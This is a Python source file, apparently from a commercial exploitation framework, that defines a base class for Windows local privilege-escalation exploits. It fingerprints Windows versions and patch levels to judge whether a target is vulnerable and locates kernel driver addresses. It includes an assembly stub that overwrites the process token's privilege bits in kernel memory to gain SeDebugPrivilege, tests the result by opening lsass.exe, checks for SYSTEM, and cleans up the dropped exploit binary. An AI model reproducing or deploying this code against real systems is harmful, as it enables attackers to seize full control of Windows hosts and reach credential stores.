#!/usr/bin/env python

"""
WindowsLocalExploit.py - Stubs for Windows locals
"""
import sys
import logging

if "." not in sys.path:
    sys.path.append(".")

from MOSDEF import mosdef
from ExploitTypes.localexploit import LocalExploit


class WindowsLocalExploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.remote_exp = ""

    def get_file_version(self, lib):
        app = self.engine.getModuleExploit("getfileversion")
        app.link(self)
        app.argsDict["passednodes"]   = [self.node]
        app.argsDict["filetoprocess"] = lib
        r = app.run()
        if r:
            version = app.result
            return version
        else:
            return None

    def _cmp_file_ver(self, should, have):
        # We have only 1 version, so every version previous to this
        # *should* be vulnerable
        if type(should) == type(''):
            should = map(int, should.split('.'))
            if have < should:
                # yes!, we have a version minor to the patch
                return 1
            else:
                # no luck
                return 0
        elif type(should) == type( () ) or type(should) == type( [] ):
            minum, maxim = map(lambda x: x.split('.'), should)
            minum = map(int, minum)
            maxim = map(int, maxim)
            if have > minum and have < maxim:
                return 1
            else:
                return 0
        # sometimes fatal errors are useful
        else:
            raise Exception('[EE] Bad define: check for documentation on how to define vuln_libraries')

    #
    # Caveat:
    # - files has to be a dictionary in the form:
    # files['c:\\windows\\system32\\win32k.sys'] = '6.1.0.305'
    # files['c:\\windows\\system32\\win32k.sys'] = ('6.1.0.299','6.1.0.305')
    #
    # key is the file path
    # value(s) is/are the expected version(s)
    #
    # Return values:
    #  0: not vulnerable
    #  1: vulnerable
    # -1: Undetermined
    #
    def check_if_vulnerable(self, files):
        if type( files ) != type( {} ):
            return -1
        if files == {}:
            return -1

        # let's check if the system has vulnerable libraries
        for f, ver in files.items():
            cur_ver = self.get_file_version(f)
            # filter
            if type(cur_ver) != type( () ):
                return -1
            if cur_ver == []:
                return -1
            if not self._cmp_file_ver(ver, list(cur_ver)):
                return 0

        # if all libraries satisfies we are vulnerable
        return 1

    def is_32bit_node(self):
        if self.node.nodetype == "win32Node":
            return True
        else:
            return False

    def is_64bit_node(self):
        if self.node.nodetype == "win64Node":
            return True
        else:
            return False

    def has_wow64(self):
        if self.node.shell.has_wow_64 and self.node.shell.is_wow_64:
            return True
        else:
            return False

    def GetVersionEx(self):
        ret, os_version = self.node.shell.GetVersionEx()

        return os_version["Major Version"], os_version["Minor Version"], os_version["SP Major Version"]

    def is_workstations(self):
        """
        Calls RtlGetVersion() or GetVersionExA() to fetch the product type.
        This function is mandatory to make a distinction between some Windows version.
        e.g. without it one cannot tell if one is Windows 2008 R2 or Win7
        """
        t = self.node.shell.os_producttype()
        if t == 1:
            return True
        else:
            return False

    # Kernel 5.1
    # Notes:
    #  - Non professional versions of Windows XP
    #  - There is no ambiguity as Windows XP is the only one with the kernel 5.1

    def is_winxp_node(self):
        major, minor, sp = self.GetVersionEx()

        # The first constraint is that (major,minor) must be (5,1)
        if major == 5 and minor == 1:
            return True

        return False

    def is_winxpsp2_node(self):
        major, minor, sp = self.GetVersionEx()

        # The first constraint is that (major,minor) must be (5,1)
        if major == 5 and minor == 1 and sp == 2:
            return True

        return False

    def is_winxpsp3_node(self):
        major, minor, sp = self.GetVersionEx()

        if major == 5 and minor == 1 and sp == 3:
            return True

        return False

    # Kernel 5.2
    # Notes:
    #       - One should be careful with the fact that Windows 2003 and Windows 2003 R2
    #         are two different OS!
    #       - So are Windows XP and Windows XP Pro (64 bits) and not just because
    #         of the architecture but also because of the kernel version

    def is_win2003_node(self):
        major, minor, sp = self.GetVersionEx()

        # The first constraint is that (major,minor) must be (5,2)
        if not major == 5 or not minor == 2:
            return False

        # Windows XP pro and Vista both have kernel 5.2
        return (not self.is_workstations())

    def is_win2003sp2_node(self):
        major, minor, sp = self.GetVersionEx()

        if not major == 5 or not minor == 2 or not sp == 2:
            return False

        # Windows XP pro and Vista both have kernel 5.2
        return (not self.is_workstations())

    def is_winxppro_node(self):
        major, minor, sp = self.GetVersionEx()

        # The first constraint is that (major,minor) must be (5,2)
        if not major == 5 or not minor == 2:
            return False

        # According to MS, WinXP 64 bits Pro & Win 2003 both return (5,2).
        return (self.is_workstations())

    # Kernel 6.0
    # Notes:
    #       - One should be careful with the fact that Windows 2008 and Windows 2008 R2
    #         are two different OS!
    #       - Windows Vista, though rare, is also a kernel 6.0

    def is_winvista_node(self):
        major, minor, sp = self.GetVersionEx()

        if not major == 6 or not minor == 0:
            return False

        # Windows 2008 (not R2) and Vista both have kernel 6.0
        return (self.is_workstations())

    def is_win2008_node(self):
        major, minor, sp = self.GetVersionEx()

        if not major == 6 or not minor == 0:
            return False

        # Windows 2008 (not R2) and Vista both have kernel 6.0
        return (not self.is_workstations())

    # Kernel 6.1
    # Notes:
    #       - One should be careful with the fact that Windows 2008 and Windows 2008 R2
    #         are two different OS!
    #       - Windows 2008 R2 & Win7 have the same kernel

    def is_win2008r2_node(self):
        major, minor, sp = self.GetVersionEx()

        if not major == 6 or not minor == 1:
            return False

        # Windows 2008 R2 and Win7 both have kernel 6.1
        return (not self.is_workstations())

    def is_win7_node(self):
        major, minor, sp = self.GetVersionEx()

        if not major == 6 or not minor == 1:
            return False

        # Windows 2008 R2 and Win7 both have kernel 6.1
        return (self.is_workstations())

    # Kernel 6.2
    #       - One should be careful with the fact that Win8 and Win8.1
    #         are two different OS!
    #       - So are Windows 2012 and Windows 2012 R2!
    #       - Win8 & Win2012 have the same kernel


    def __is_kernel_62(self):
        major, minor, sp = self.GetVersionEx()

        # GetVersionEx _always_ return 6.2 for kernels >= 6.2
        if not major == 6 or not minor == 2:
            return False

        # VerifyVersionInfo returns 6.3 for a 6.3 kernel
        if self.node.shell.VerifyVersionInfo(6,3):
            return False

        # However VerifyVersionInfo() will return 6.2 for kernel >= 10!!!
        # Therefore we need an extra check!
        if bool(self.node.shell.os_major_geq(10)):
            return False

        return True

    def is_win8_node(self):

        if not self.__is_kernel_62():
            return False

        # Windows 2012 (not R2) and Win8 both have kernel 6.2
        return (self.is_workstations())

    def is_win2012_node(self):

        if not self.__is_kernel_62():
            return False

        # Windows 2012 (not R2) and Win8 both have kernel 6.2
        return (not self.is_workstations())

    # Kernel 6.3
    #       - Win8.1 & Win2012 R2 have the same kernel
    #       - Starting with with these kernels we have to use tricks otherwise
    #         just using the API is gonna lead us to misdetections

    def __is_kernel_63(self):
        major, minor, sp = self.GetVersionEx()

        # GetVersionEx _always_ return 6.2 for kernels >= 6.2
        if not major == 6 or not minor == 2:
            return False

        # VerifyVersionInfo can detect a kernel 6.3
        return self.node.shell.VerifyVersionInfo(6,3)

    def is_win81_node(self):

        if not self.__is_kernel_63():
            return False

        # Windows 2012 R2 and Win81 both have kernel 6.3
        return (self.is_workstations())

    def is_win2012r2_node(self):

        if not self.__is_kernel_63():
            return False

        # Windows 2012 R2 and Win81 both have kernel 6.3
        return (not self.is_workstations())

    # Kernel 6.4 / 10
    #       - Win10 & Win2016 have the same kernel
    #       - Starting with this kernel version the kernel versions have changed
    #         and instead of going to 6.4 or 7.0, MS chose 10.0 ...
    #       - Windows 10's kernel may return 6.4 in its first versions (such as 
    #         its beta so we should assume a similar behavior on Windows server 2016

    def __is_kernel_64(self):
        major, minor, sp = self.GetVersionEx()

        # GetVersionEx _always_ return 6.2 for kernels >= 6.2
        if not major == 6 or not minor == 2:
            return False

        # VerifyVersionInfo can detect a kernel 6.4
        return self.node.shell.VerifyVersionInfo(6,4)

    def is_win10_node(self):
        return ((self.__is_kernel_64() or bool(self.node.shell.os_major_geq(10))) and self.is_workstations())

    def is_win2016_node(self):
        return ((self.__is_kernel_64() or bool(self.node.shell.os_major_geq(10))) and not self.is_workstations())

    #
    # Caveat:
    # - basename is utf-16le encoded
    #
    def get_driver_base(self, name):
        # uname = unicode(name, encoding="latin1")
        ret, addresses = self.node.shell.EnumDeviceDrivers()
        if ret != 1:
            self.log_error('EnumDeviceDrivers failed')
            return None, None

        found = False
        for image_base in addresses:
            ret, basename = self.node.shell.GetDeviceDriverBaseName(image_base)
            if ret != 0 and basename.find(name.encode("utf-16le")) != -1:
                found = True
                break

        if not found:
            self.log_error('Base address not found for %s' % name)
            return None, None

        return basename, image_base

    def DeviceIoControl(self, hDevice, IoControlCode, InBuffer = 0, InBufferSize = 0, OutBuffer = 0, OutBufferSize = 0):
        lvars = {}
        lvars['hDevice']        = hDevice
        lvars['IoControlCode']  = IoControlCode
        lvars['InBuffer']       = InBuffer
        lvars['InBufferSize']   = InBufferSize
        lvars['OutBuffer']      = OutBuffer
        lvars['OutBufferSize']  = OutBufferSize

        code = """
        #import "remote", "kernel32.dll|DeviceIoControl" as "DeviceIoControl"

        #import "local",  "sendint"       as "sendint"

        #import "int",    "hDevice"       as "hDevice"
        #import "int",    "IoControlCode" as "IoControlCode"
        #import "int",    "InBuffer"      as "InBuffer"
        #import "int",    "InBufferSize"  as "InBufferSize"
        #import "int",    "OutBuffer"     as "OutBuffer"
        #import "int",    "OutBufferSize" as "OutBufferSize"

        void main() {
            int ret;
            int cb;

            ret = DeviceIoControl(hDevice, IoControlCode, InBuffer, InBufferSize, OutBuffer, OutBufferSize, &cb, 0);
            sendint(ret);
        }
        """
        ret = self.node.shell.runCode(code, lvars)
        return ret

    def enable_sedebugprivilege_stub_32(self):
        token_address = self.node.shell.get_process_token_ring0_address()
        self.nlog("Process Ring0 Token Address: 0x%08x" % token_address)

        # offset to SePrivileges
        token_address = token_address + 0xA0

        asm = """
        push %ebx
        movl $0xTOKENADDRESS, %ebx
        mov $0x00000014, (%ebx)
        pop %ebx
        ret $0x8
        """

        asm = asm.replace("TOKENADDRESS", "%08x" % token_address)
        arch = 'x86'

        shellcode = mosdef.assemble(asm, arch)
        return shellcode

    #
    # simply check if we can get a handle to lsass
    # and in case we do, means we correctly patched our sePrivileges
    #
    def seDebugPrivilege_enabled(self):
        process_list = self.node.shell.processlist()

        for process in process_list:
            if process["exe"] == "lsass.exe":
                pid = process["pid"]
                break

        # try to get a handle to lsass
        hLSASS = self.node.shell.openprocess(pid)
        if hLSASS:
            ret = True
        else:
            ret = False

        self.node.shell.CloseHandle(hLSASS)
        return ret

    #
    # returns True in case we are (already) SYSTEM
    # XXX: this could be generic but then we would need to rename the one
    #      for linux locals
    #
    def compromised(self):
        whoami = self.exploitnodes('whoami', [self.node])[0]
        if whoami[-1] == '$':
            return True

        return False

    #
    # Deprecated, here for retrocompat
    # Superseeded by canvasexploit.add_file_for_cleanup()
    #
    def cleanup(self):
        self.nlog('Cleaning up')

        if not self.nodeDeleteFile(self.remote_exp):
            self.log_error("Error while removing exploit binary (%s)" % self.remote_exp)

    #
    # Get the Windows 'Release ID'
    # Used to verify the Windows 10 release id 
    #
    def get_releaseid(self):
        from WindowsConstants import KEY_QUERY_VALUE
        from WindowsConstants import HKEY_LOCAL_MACHINE

        RELEASEID_KEY = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"
        hKey = self.node.shell.get_reg_key_handle(HKEY_LOCAL_MACHINE, RELEASEID_KEY, KEY_QUERY_VALUE)

        release_id = int(str(self.node.shell.RegQueryValueEx(hKey, "ReleaseID")[2]).strip('\0'))

        return release_id
